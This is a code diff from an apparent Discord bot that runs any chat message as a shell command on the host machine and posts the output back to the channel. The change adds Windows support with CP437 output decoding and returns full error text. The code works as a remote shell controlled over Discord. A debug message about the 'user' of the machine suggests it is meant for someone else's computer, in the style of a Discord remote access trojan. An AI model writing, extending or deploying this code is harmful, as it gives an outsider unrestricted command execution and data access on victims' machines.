@@ -87,7 +87,7 @@ async def on_message(message):
                 print("No processes to kill")
 
         except Exception as e:
-            await message.channel.send("Error")
+            await message.channel.send(str(e))
 
     elif message.content.startswith('!help'):
 
@@ -151,22 +151,35 @@ async def on_message(message):
         command = message.content[1:]
 
         try:
-            process = subprocess.Popen(
-                command, shell=True, universal_newlines=True,
-                preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE
-            )
+            if platform.system() == "Windows":
+                if platform.system() == "Windows":
+                    def shell(command):
+                        output = subprocess.run(command, stdout=subprocess.PIPE, shell=True, stderr=subprocess.PIPE,
+                                                stdin=subprocess.PIPE)
+                        return output.stdout.decode('CP437').strip()
 
-            async def send_output():
-                while process.poll() is None:
-                    output = process.stdout.readline()
-                    if output:
-                        await message.channel.send(output)
+                    out = shell(command)
+                    print(out)
+                    await message.channel.send(out)
 
-                remaining_output = process.stdout.read()
-                if remaining_output:
-                    await message.channel.send(remaining_output)
+            else:
+                print("user is not using windows")
+                process = subprocess.Popen(
+                    [command], shell=True, universal_newlines=True,
+                    preexec_fn=os.setsid, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+                )
 
-            await asyncio.create_task(send_output())
+                async def send_output():
+                    while process.poll() is None:
+                        output = process.stdout.readline()
+                        if output:
+                            await message.channel.send(output)
+
+                    remaining_output = process.stdout.read()
+                    if remaining_output:
+                        await message.channel.send(remaining_output)
+
+                await asyncio.create_task(send_output())
 
         except Exception as e:
             await message.channel.send(str(e))
